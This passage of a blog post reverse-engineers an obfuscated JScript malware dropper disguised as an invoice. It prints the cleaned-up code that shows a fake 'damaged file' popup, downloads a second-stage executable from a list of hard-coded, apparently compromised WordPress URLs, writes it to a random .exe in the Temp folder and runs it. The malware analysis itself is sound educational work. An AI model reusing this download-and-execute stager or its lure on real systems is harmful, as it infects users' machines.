</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x2a0d9c</span>[<span style="color:#a6e22e">getBigArrayItem</span>(<span style="color:#e6db74">&#39;0x0&#39;</span>)](<span style="color:#a6e22e">getBigArrayItem</span>(<span style="color:#e6db74">&#39;0x1&#39;</span>), <span style="color:#a6e22e">_0x3b1cb2</span>, <span style="color:#f92672">!</span>[]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x2a0d9c</span>[<span style="color:#a6e22e">getBigArrayItem</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)]();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">_0x2a0d9c</span>[<span style="color:#a6e22e">getBigArrayItem</span>(<span style="color:#e6db74">&#39;0x3&#39;</span>)] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc8</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x55d28b</span>(<span style="color:#a6e22e">_0x2a0d9c</span>[<span style="color:#a6e22e">getBigArrayItem</span>(<span style="color:#e6db74">&#39;0x4&#39;</span>)], <span style="color:#f92672">!</span>[]);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x55d28b</span>(<span style="color:#66d9ef">null</span>, <span style="color:#f92672">!!</span>[]);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">_0x373527</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x55d28b</span>(<span style="color:#66d9ef">null</span>, <span style="color:#f92672">!!</span>[]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The function has two parameters, what I can assume is a URL and a callback function.</p>
<p>The function creates an XMLHTTP object and then calls some methods of it using the big array.</p>
<p>The most interesting quirk of this function however are these empty arrays.</p>
<p>Well it turns out that <a href="https://stackoverflow.com/questions/38662231/evaluates-to-true">for some reason</a> <code>![]</code> evaluates to <code>false</code> and <code>!![]</code> evaluates to true. Just another weird way of obfuscating the true functionality of this code.</p>
<p>Renaming variables and substituting the items called with <code>getBigArrayItem()</code>, the code looks clearer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">callback</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">XMLHTTPObject</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">XMLHTTPObject</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">url</span>, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">XMLHTTPObject</span>.<span style="color:#a6e22e">send</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">XMLHTTPObject</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#a6e22e">XMLHTTPObject</span>.<span style="color:#a6e22e">ResponseBody</span>, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">_0x373527</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It&rsquo;s now a lot clearer what the function does. Takes in a URL, performs a GET request then returns the response if successful. If the request fails or the status code isn&rsquo;t 200, the second variable returned in the callback is true, leading me to believe that the second parameter would be named something along the lines of <code>failed</code></p>
<p>Also, I have no idea what <code>_0x373527</code> is. It isn&rsquo;t referenced anywhere else in the file.</p>
<p>The next function reminds me of my first JavaScript project:</p>
<p>As much as this hurts to look at, it at least also has an unobfuscated name of <code>getData</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getData</span>(<span style="color:#a6e22e">_0x1aaca7</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#e6db74">&#39;http://www.bekkedekor.com/wp-content/uploads/R_b/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x3f9061</span>, <span style="color:#a6e22e">_0x8a6fe0</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">_0x8a6fe0</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x1aaca7</span>(<span style="color:#a6e22e">_0x3f9061</span>, <span style="color:#f92672">!</span>[]);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#e6db74">&#39;http://www.bayonetrobles.com/wp-includes/fi_g/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x3f9061</span>, <span style="color:#a6e22e">_0x8a6fe0</span>){
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">_0x8a6fe0</span>){
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x1aaca7</span>(<span style="color:#a6e22e">_0x3f9061</span>, <span style="color:#f92672">!</span>[]);
</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#a6e22e">getBigArrayItem</span>(<span style="color:#e6db74">&#39;0x5&#39;</span>), <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x3f9061</span>, <span style="color:#a6e22e">_0x8a6fe0</span>){
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">_0x8a6fe0</span>){
</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x1aaca7</span>(<span style="color:#a6e22e">_0x3f9061</span>, <span style="color:#f92672">!</span>[]);
</span></span><span style="display:flex;"><span>                            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                                <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#e6db74">&#39;http://association-bts-clim-souillac.shop/wp-content/T_q/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x3f9061</span>, <span style="color:#a6e22e">_0x8a6fe0</span>){
</span></span><span style="display:flex;"><span>                                    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">_0x8a6fe0</span>){
</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x1aaca7</span>(<span style="color:#a6e22e">_0x3f9061</span>, <span style="color:#f92672">!</span>[])
</span></span><span style="display:flex;"><span>                                    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                                        <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#e6db74">&#39;http://kannada.awgp.org/wp-content/uploads/eq_Q/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x3f9061</span>, <span style="color:#a6e22e">_0x8a6fe0</span>){
</span></span><span style="display:flex;"><span>                                            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">_0x8a6fe0</span>){
</span></span><span style="display:flex;"><span>                                                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x1aaca7</span>(<span style="color:#a6e22e">_0x3f9061</span>, <span style="color:#f92672">!</span>[]);
</span></span><span style="display:flex;"><span>                                            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                                                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x1aaca7</span>(<span style="color:#66d9ef">null</span>, <span style="color:#f92672">!!</span>[]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                            }
</span></span><span style="display:flex;"><span>                                        });
</span></span><span style="display:flex;"><span>                                    }
</span></span><span style="display:flex;"><span>                                });
</span></span><span style="display:flex;"><span>                            }
</span></span><span style="display:flex;"><span>                        });
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                });
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">_0x3b48dd</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x1aaca7</span>(<span style="color:#66d9ef">null</span>, <span style="color:#f92672">!!</span>[]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The function just takes in a callback function, and calls <code>getDataFromUrl</code> on a bunch of hard-coded URLs, as well as one in the big array. The function seems to return the callback with the same format as <code>getData</code>, with the last argument returning <code>false</code> if successful and <code>true</code> if failed.</p>
<p>Cleaning it up we get</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getData</span>(<span style="color:#a6e22e">callback</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#e6db74">&#39;http://www.bekkedekor.com/wp-content/uploads/R_b/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#a6e22e">data</span>, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#e6db74">&#39;http://www.bayonetrobles.com/wp-includes/fi_g/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#a6e22e">data</span>, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#e6db74">&#34;http://bekkedekor.com/wp-content/uploads/G_I/&#34;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#a6e22e">data</span>, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>                            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                                <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#e6db74">&#39;http://association-bts-clim-souillac.shop/wp-content/T_q/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>                                    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#a6e22e">data</span>, <span style="color:#66d9ef">false</span>)
</span></span><span style="display:flex;"><span>                                    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                                        <span style="color:#a6e22e">getDataFromUrl</span>(<span style="color:#e6db74">&#39;http://kannada.awgp.org/wp-content/uploads/eq_Q/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>                                            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>                                                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#a6e22e">data</span>, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>                                            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                                                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                            }
</span></span><span style="display:flex;"><span>                                        });
</span></span><span style="display:flex;"><span>                                    }
</span></span><span style="display:flex;"><span>                                });
</span></span><span style="display:flex;"><span>                            }
</span></span><span style="display:flex;"><span>                        });
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                });
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">_0x3b48dd</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So the function goes down the list trying every URL until it finds one that succeeds, then returns the <code>ResponseBody</code> from the request.</p>
<h1 id="the-bad-stuff">The Bad Stuff™<a hidden class="anchor" aria-hidden="true" href="#the-bad-stuff">#</a></h1>
<p>These next couple functions are where this script&rsquo;s malicious intentions are shown.</p>
<p>A function called <code>getTempFilePath</code> is pretty self explanatory, and substituting in the values from the big array it is made even more clear:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTempFilePath</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x40e2ac</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;Scripting.FileSystemObject&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x8419b0</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\x5c&#39;</span> <span style="color:#f92672">+</span> Math.<span style="color:#a6e22e">random</span>().<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>).<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.exe&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x123c3d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x40e2ac</span>.<span style="color:#a6e22e">GetSpecialFolder</span>(<span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">_0x8419b0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x123c3d</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">_0xdfa6af</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>[];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The function creates a FileSystemObject and generates a random string starting with &ldquo;&quot; (\x5c) and ending with &ldquo;.exe&rdquo;</p>
<p>That random string is then appended onto <code>GetSpecialFolder(2)</code> (the path of the Temp folder) and returned. e.g. <code>%TEMP%\242986749624.exe</code></p>
<p>The next function called <code>saveToTemp</code>, does exactly that. It calls <code>getTempFilePath</code> and writes the data from its first parameter to the file path. I&rsquo;ve renamed some variables for readability</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">saveToTemp</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">callback</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tempFilePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getTempFilePath</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">tempFilePath</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stream</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;ADODB.Stream&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">stream</span>.<span style="color:#a6e22e">Open</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">stream</span>.<span style="color:#a6e22e">Type</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">stream</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">stream</span>.<span style="color:#a6e22e">Position</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">stream</span>.<span style="color:#a6e22e">SaveToFile</span>(<span style="color:#a6e22e">tempFilePath</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">stream</span>.<span style="color:#a6e22e">Close</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#a6e22e">tempFilePath</span>, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">_0x500759</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Pretty boring, but simple enough.</p>
<h1 id="all-together-now">All together now!<a hidden class="anchor" aria-hidden="true" href="#all-together-now">#</a></h1>
<p>With all these functions defined, the last chunk of the file is what actually calls them:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">getData</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x241c32</span>, <span style="color:#a6e22e">_0x265816</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WshShell</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>[<span style="color:#a6e22e">_0x1f80</span>(<span style="color:#e6db74">&#39;0xe&#39;</span>)](<span style="color:#a6e22e">_0x1f80</span>(<span style="color:#e6db74">&#39;0xf&#39;</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Text</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x1f80</span>(<span style="color:#e6db74">&#39;0x10&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Title</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x1f80</span>(<span style="color:#e6db74">&#39;0x11&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WshShell</span>[<span style="color:#a6e22e">_0x1f80</span>(<span style="color:#e6db74">&#39;0x12&#39;</span>)](<span style="color:#a6e22e">Text</span>, <span style="color:#ae81ff">0x0</span>, <span style="color:#a6e22e">Title</span>, <span style="color:#ae81ff">0x0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">_0x265816</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">saveToTemp</span>(<span style="color:#a6e22e">_0x241c32</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x549678</span>,<span style="color:#a6e22e">_0x265816</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">_0x265816</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x5578e7</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#a6e22e">_0x1f80</span>(<span style="color:#e6db74">&#39;0xf&#39;</span>));
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">_0x5578e7</span>[<span style="color:#a6e22e">_0x1f80</span>(<span style="color:#e6db74">&#39;0x13&#39;</span>)](<span style="color:#a6e22e">_0x549678</span>);
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">_0x2e70a6</span>){}
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>Something common in almost all JScript malware is the use of <code>WScript.Shell</code>, and this is no exception. We can see unobfuscated references to <code>WshShell</code> and <code>WScript</code>.</p>
<p><code>WScript.Shell</code> exposes a bunch of windows shell functionality, the most useful for malware being the ability to run an executable, perhaps one downloaded and saved to a specific random temporary file?</p>
<p>Cleaned up, the code looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">getData</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WshShell</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">CreateObject</span>(<span style="color:#e6db74">&#39;WScript.Shell&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Text</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;There was an error opening this document. The file is damaged and could not be repaired (for example, it was sent as an email attachment and wasn&#39;t correctly decoded).&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Title</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Not Supported File Format&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WshShell</span>.<span style="color:#a6e22e">Popup</span>(<span style="color:#a6e22e">Text</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">Title</span>, <span style="color:#ae81ff">64</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">saveToTemp</span>(<span style="color:#a6e22e">data</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">filePath</span>, <span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">failed</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shell</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;WScript.Shell&#39;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">shell</span>.<span style="color:#a6e22e">Run</span>(<span style="color:#a6e22e">filePath</span>);
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">_0x2e70a6</span>){
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>The script creates a <code>WScript.Shell</code> object which creates a popup message that looks like this:</p>
<figure>
    <img loading="lazy" src="images/popup.png"/> <figcaption>
            &gt;Popup Message
        </figcaption>
</figure>

<p>This message is written to look like a system error message, probably to try and explain why no document opens when the user runs the file, even though it is pretending to be an invoice. After all, I would be a lot more suspicious of a file that did nothing when ran versus one that shows an error.</p>
<p>The code then downloads the payload from <code>getData</code>, saves it using <code>saveToTemp</code> and then runs it with a new <code>WScript.Shell</code>. That&rsquo;s it. All of this to just download and run a second stage payload from the internet.</p>
<p>(Un)fortunately, all the websites seem to 404 when I tried to access them which makes sense since this specific sample is 3 years old now. Dead end it seems.</p>
<p>I&rsquo;ve learned a lot from this project and it was fun trying to figure out how all of these obfuscation techniques work and can be reversed. The sample is available on <a href="https://bazaar.abuse.ch/">Malware Bazaar</a> using the md5 <code>0dde38d34e4ddd5b43cbfe6aa52db911</code>. Even though the servers for this sample have been shut down, still be careful whenever handling malware samples.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://meltingcomputer.github.io">meltingcomputer</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
